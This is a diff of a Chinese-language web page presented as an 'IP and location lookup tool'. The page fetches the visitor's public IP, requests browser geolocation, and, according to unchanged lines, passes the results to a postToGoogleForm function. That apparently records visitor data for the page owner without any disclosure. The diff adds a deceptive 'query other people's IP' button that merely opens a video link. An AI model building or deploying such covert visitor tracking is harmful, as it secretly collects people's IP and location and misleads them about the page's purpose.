@@ -2,19 +2,20 @@
 <html lang="zh-CN">
 <head>
   <meta charset="UTF-8" />
-  <title>IP与定位查询工具</title>
+  <title>IP与定位查询工具（完整版）</title>
   <style>
     body { font-family: Arial, sans-serif; padding: 20px; }
-    #status { margin-top: 20px; white-space: pre-wrap; }
-    button { margin-top: 10px; padding: 10px 15px; font-size: 16px; }
+    #status { margin-top: 20px; white-space: pre-wrap; border: 1px solid #ccc; padding: 10px; min-height: 120px; }
+    button { margin-top: 10px; padding: 10px 15px; font-size: 16px; cursor: pointer; }
   </style>
 </head>
 <body>
-  <h1>IP与定位查询工具</h1>
-  <p>请允许定位权限以确保功能运作正常（点击按钮后才会请求定位权限）</p>
+  <h1>IP与定位查询工具（完整版）</h1>
+  <p>请点击下方按钮操作，页面加载时不会请求定位权限。</p>
 
   <button id="showIpBtn">显示当前公网 IP</button>
   <button id="locateBtn">点击获取定位并查询国家</button>
+  <button id="bilibiliBtn">点此查询他人IP</button>
 
   <pre id="status">状态信息将显示在这里...</pre>
 
@@ -28,8 +29,8 @@
     // 获取公网IP
     async function getIP() {
       try {
-        let res = await fetch('https://api.ipify.org?format=json');
-        let data = await res.json();
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
         return data.ip;
       } catch {
         return "获取失败";
@@ -68,7 +69,7 @@
       }).catch(console.error);
     }
 
-    // 显示IP按钮事件
+    // 显示当前公网IP按钮事件
     document.getElementById('showIpBtn').addEventListener('click', async () => {
       const status = document.getElementById('status');
       status.textContent = "查询中……";
@@ -101,12 +102,12 @@
         postToGoogleForm(ip, "失败", "失败");
       }, {timeout: 15000});
     });
+
+    // 打开哔哩哔哩视频按钮事件
+    document.getElementById('bilibiliBtn').addEventListener('click', () => {
+      window.open("https://www.bilibili.com/video/BV1GJ411x7h7/?spm_id_from=333.337.search-card.all.click&vd_source=7504f18c191405de66c8b613d77dfea9", "_blank");
+    });
   </script>
 </body>
 </html>
 
-
-    main();
-  </script>
-</body>
-</html>
